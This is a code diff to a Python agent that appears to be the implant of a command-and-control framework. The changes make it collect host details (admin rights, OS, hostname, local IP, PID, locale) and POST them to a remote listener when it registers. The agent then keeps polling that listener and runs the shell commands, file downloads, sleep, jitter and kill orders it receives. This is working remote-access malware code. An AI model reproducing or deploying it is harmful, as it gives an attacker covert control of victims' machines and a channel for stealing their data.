@@ -1,8 +1,12 @@
 import base64
+import ctypes
 import json
+import locale
+import logging
 import os
 import platform
 import random
+import socket
 import subprocess
 import time
 import urllib.error
@@ -437,10 +441,13 @@ class Connection:
         self._listener_base_url = f"http://{self.remote_host}:{self.remote_port}"
         self._agent_id = None
 
-    def register_with_listener(self):
-        agent_id_response = urllib.request.urlopen(
+    def register_with_listener(self, agent_data):
+        register_request = urllib.request.Request(
             f"{self._listener_base_url}{random.choice(self.registration_url_paths)}",
+            data=json.dumps(agent_data).encode(),
+            method="POST",
         )
+        agent_id_response = urllib.request.urlopen(register_request)
         agent_id = json.loads(agent_id_response.read().decode())["agent_id"]
         self._agent_id = agent_id
         return agent_id
@@ -497,87 +504,135 @@ class Agent:
         time.sleep(time_to_sleep)
 
     def run_agent(self):
-        while True:
-            while True:
-                try:
-                    self.connection.register_with_listener()
-                    break
-                except urllib.error.URLError:
-                    self._sleep()
+        def get_is_admin():
+            try:
+                return os.getuid() == 0
+            except AttributeError:
+                return ctypes.windll.shell32.IsUserAnAdmin() != 0
 
-            while True:
-                tasks = self.connection.get_tasks_from_listener()
-                print(tasks)
-                for task in tasks:
-                    # elif task["command"] == "load_module":
-                    #     module_name = task["arguments"][0]
-                    #     module_source_code = task["arguments"][1]
-                    #     result = self.module_loader.load_module(
-                    #         module_name, module_source_code
-                    #     )
-                    if task["command"] == "shell":
-                        result = shell_capability(task["arguments"])
-                        self.connection.post_results_to_listener(
-                            task["task_id"], **result
-                        )
-                    elif task["command"] == "ping":
-                        result = ping_capability(task["arguments"])
-                        self.connection.post_results_to_listener(
-                            task["task_id"], **result
-                        )
-                    elif task["command"] == "sleep":
-                        result = sleep_capability(task["arguments"])
-                        self.connection.post_results_to_listener(
-                            task["task_id"], **result
-                        )
-                        time.sleep(task["arguments"]["duration"])
-                        continue
-                    elif task["command"] == "disconnect":
-                        result = disconnect_capability(task["arguments"])
-                        self.connection.post_results_to_listener(
-                            task["task_id"], **result
-                        )
+        def get_local_host_address():
+            test_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            test_socket.settimeout(0)
+            try:
+                test_socket.connect(("10.254.254.254", 1))
+                local_host_address = test_socket.getsockname()[0]
+            except Exception:
+                local_host_address = "127.0.0.1"
+            finally:
+                test_socket.close()
+            return local_host_address
+
+        agent_data_querying_functions = {
+            "is_admin": get_is_admin,
+            "os": lambda: platform.system() + " " + platform.release(),
+            "version": platform.version,
+            "arch": platform.machine,
+            "pid": os.getpid,
+            "locale": lambda: " ".join(locale.getlocale()),
+            "local_host_address": get_local_host_address,
+            "hostname": platform.node,
+        }
+        agent_data = {}
+        for data_name, data_function in agent_data_querying_functions.items():
+            try:
+                agent_data[data_name] = data_function()
+            except Exception as exc:
+                logging.error(exc)
+
+        while True:
+            try:
+                while True:
+                    try:
+                        self.connection.register_with_listener(agent_data)
                         break
-                    elif task["command"] == "kill":
-                        result = kill_capability(task["arguments"])
-                        self.connection.post_results_to_listener(
-                            task["task_id"], **result
-                        )
-                        exit()
-                    elif task["command"] == "delay":
-                        result = delay_capability(task["arguments"])
-                        self.connection.post_results_to_listener(
-                            task["task_id"], **result
-                        )
-                        self.connection.sleep_time = task["arguments"]["duration"]
-                        self.connection.sleep_time_jitter = task["arguments"]["jitter"]
-                    elif task["command"] == "download":
-                        for result in download_capability(task["arguments"]):
+                    except urllib.error.URLError:
+                        self._sleep()
+
+                while True:
+                    tasks = self.connection.get_tasks_from_listener()
+                    logging.debug(tasks)
+                    for task in tasks:
+                        if task["command"] == "shell":
+                            result = shell_capability(task["arguments"])
                             self.connection.post_results_to_listener(
                                 task["task_id"],
                                 **result,
                             )
-                            self._sleep()
-                        continue
-                    # elif task["command"] == "unload_module":
-                    #     module_name = task["arguments"][0]
-                    #     result = self.module_loader.unload_module(module_name)
-                    #     self.connection.post_results_to_listener(task["task_id"], **result)
-                    # elif task["command"] == "reload_module":
-                    #     module_name = task["arguments"][0]
-                    #     result = self.module_loader.unload_module(module_name)
-                    #     self.connection.post_results_to_listener(task["task_id"], **result)
-                    # else:
-                    #     module_name = task["command"]
-                    #     arguments = task["arguments"]
-                    #     self.module_loader.run_module(
-                    #         module_name, arguments, self.connection
-                    #     )
+                        elif task["command"] == "ping":
+                            result = ping_capability(task["arguments"])
+                            self.connection.post_results_to_listener(
+                                task["task_id"],
+                                **result,
+                            )
+                        elif task["command"] == "sleep":
+                            result = sleep_capability(task["arguments"])
+                            self.connection.post_results_to_listener(
+                                task["task_id"],
+                                **result,
+                            )
+                            time.sleep(task["arguments"]["duration"])
+                            continue
+                        elif task["command"] == "disconnect":
+                            result = disconnect_capability(task["arguments"])
+                            self.connection.post_results_to_listener(
+                                task["task_id"],
+                                **result,
+                            )
+                            break
+                        elif task["command"] == "kill":
+                            result = kill_capability(task["arguments"])
+                            self.connection.post_results_to_listener(
+                                task["task_id"],
+                                **result,
+                            )
+                            exit()
+                        elif task["command"] == "delay":
+                            result = delay_capability(task["arguments"])
+                            self.connection.post_results_to_listener(
+                                task["task_id"],
+                                **result,
+                            )
+                            self.connection.sleep_time = task["arguments"]["duration"]
+                            self.connection.sleep_time_jitter = task["arguments"][
+                                "jitter"
+                            ]
+                        elif task["command"] == "download":
+                            for result in download_capability(task["arguments"]):
+                                self.connection.post_results_to_listener(
+                                    task["task_id"],
+                                    **result,
+                                )
+                                self._sleep()
+                            continue
+                        # elif task["command"] == "load_module":
+                        #     module_name = task["arguments"][0]
+                        #     module_source_code = task["arguments"][1]
+                        #     result = self.module_loader.load_module(
+                        #         module_name, module_source_code
+                        #     )
+                        # elif task["command"] == "unload_module":
+                        #     module_name = task["arguments"][0]
+                        #     result = self.module_loader.unload_module(module_name)
+                        #     self.connection.post_results_to_listener(task["task_id"], **result)
+                        # elif task["command"] == "reload_module":
+                        #     module_name = task["arguments"][0]
+                        #     result = self.module_loader.unload_module(module_name)
+                        #     self.connection.post_results_to_listener(task["task_id"], **result)
+                        # else:
+                        #     module_name = task["command"]
+                        #     arguments = task["arguments"]
+                        #     self.module_loader.run_module(
+                        #         module_name, arguments, self.connection
+                        #     )
 
+                    self._sleep()
+            except Exception as exc:
+                logging.error(exc)
                 self._sleep()
 
 
 def main():
+    logging.getLogger().setLevel(logging.DEBUG)
     connection = Connection(
         remote_host=REMOTE_HOST,
         remote_port=REMOTE_PORT,
